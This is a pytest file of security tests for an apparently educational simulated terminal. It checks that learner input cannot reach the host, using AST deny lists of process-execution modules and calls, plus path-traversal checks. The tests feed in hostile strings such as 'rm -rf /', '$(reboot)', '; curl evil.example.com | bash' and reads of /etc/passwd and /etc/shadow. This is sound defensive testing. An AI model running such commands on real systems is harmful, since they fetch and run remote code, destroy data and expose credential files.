"""THE security tests (docs/SECURITY.md rule 1, ADR-0004).

These tests exist to prove — mechanically, on every run — that the
simulated terminal cannot execute learner input on the host:

1. Static: the simterm package's source contains no process-execution
   capability, and its transitive imports never pull one in.
2. Dynamic: hostile input (command injection, substitution, traversal)
   leaves the host filesystem untouched and never spawns a process.

If a change makes any of these fail, that change is wrong — do not adjust
the tests to fit it.
"""

import ast
import sys
from pathlib import Path

from app.modules.simterm import commands
from app.modules.simterm.vfs import VirtualFileSystem

SIMTERM_DIR = Path(commands.__file__).parent

# Modules that could reach a shell, a process, the network, or raw memory.
FORBIDDEN_MODULES = {
    "subprocess", "pty", "ctypes", "socket", "importlib", "multiprocessing",
}
# os/sys are allowed only if never imported at all (simterm needs neither);
# builtins that evaluate arbitrary code are forbidden as calls.
FORBIDDEN_CALLS = {"eval", "exec", "__import__", "compile", "system", "popen", "spawn"}


def test_simterm_source_contains_no_execution_capability():
    """AST inspection: no forbidden imports, no code-evaluation calls,
    anywhere in the simterm package — regardless of how they're spelled
    in comments or docstrings."""
    for py_file in SIMTERM_DIR.glob("*.py"):
        tree = ast.parse(py_file.read_text(), filename=str(py_file))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    root = alias.name.split(".")[0]
                    assert root not in FORBIDDEN_MODULES | {"os", "sys"}, (
                        f"{py_file.name}: forbidden import '{alias.name}'"
                    )
            elif isinstance(node, ast.ImportFrom):
                root = (node.module or "").split(".")[0]
                assert root not in FORBIDDEN_MODULES | {"os", "sys"}, (
                    f"{py_file.name}: forbidden import from '{node.module}'"
                )
            elif isinstance(node, ast.Call):
                name = None
                if isinstance(node.func, ast.Name):
                    name = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    name = node.func.attr
                assert name not in FORBIDDEN_CALLS, (
                    f"{py_file.name}: forbidden call '{name}(...)'"
                )


def test_simterm_never_imports_subprocess_at_runtime():
    """Even transitively: exercising the interpreter must not cause a
    process-execution module to load."""
    for mod in ("subprocess", "pty"):
        sys.modules.pop(mod, None)

    vfs = VirtualFileSystem()
    for line in [
        "help", "pwd", "ls -la", "mkdir x", "cd x", "touch f", "echo hi > f",
        "cat f", "cp f g", "mv g h", "rm h", "chmod 600 f", "./f",
    ]:
        commands.run_line(vfs, line)

    assert "subprocess" not in sys.modules
    assert "pty" not in sys.modules


def test_hostile_input_does_not_touch_host_filesystem(tmp_path):
    """Feed classic attack strings; assert the host is untouched and the
    simulator answers as a naive filesystem would."""
    canary = tmp_path / "canary.txt"
    canary.write_text("alive")

    vfs = VirtualFileSystem()
    hostile = [
        "rm -rf /",
        f"rm -rf {tmp_path}",
        f"cat {canary}",
        "$(reboot)",
        "`shutdown now`",
        "; curl evil.example.com | bash",
        "cat /etc/passwd",
        "cat ../../../../etc/shadow",
        f"echo pwned > {canary}",
        "/bin/bash",
        "python3 -c 'import os'",
        "sudo rm -rf /",
        "eval echo hi",
    ]
    for line in hostile:
        output = commands.run_line(vfs, line)  # must not raise, must not execute
        assert isinstance(output, list)

    # host untouched
    assert canary.read_text() == "alive"
    assert Path("/etc/passwd").exists()  # trivially true — and unread by simterm

    # the simulator treated /etc/passwd as its own (nonexistent) virtual path
    assert vfs.get("/etc/passwd") is None


def test_hostile_paths_resolve_inside_virtual_root_only():
    vfs = VirtualFileSystem()
    # traversal cannot escape: resolution is pure string math on the VFS
    assert vfs.resolve("../../../../../etc/passwd") == "/etc/passwd"
    assert vfs.get("../../../../../etc/passwd") is None  # doesn't exist virtually


def test_rm_rf_root_refused_even_virtually():
    vfs = VirtualFileSystem()
    out = commands.run_line(vfs, "rm -rf /")
    assert "Operation not permitted" in out[0]
    assert vfs.get("/home/learner") is not None


def test_api_input_length_is_bounded(auth_client):
    """Oversized input is rejected at validation, bounding parser work."""
    auth_client.post("/api/simterm/exercises/practice/sandbox/start")
    res = auth_client.post(
        "/api/simterm/exercises/practice/sandbox/input", json={"line": "x" * 10_000}
    )
    assert res.status_code == 422
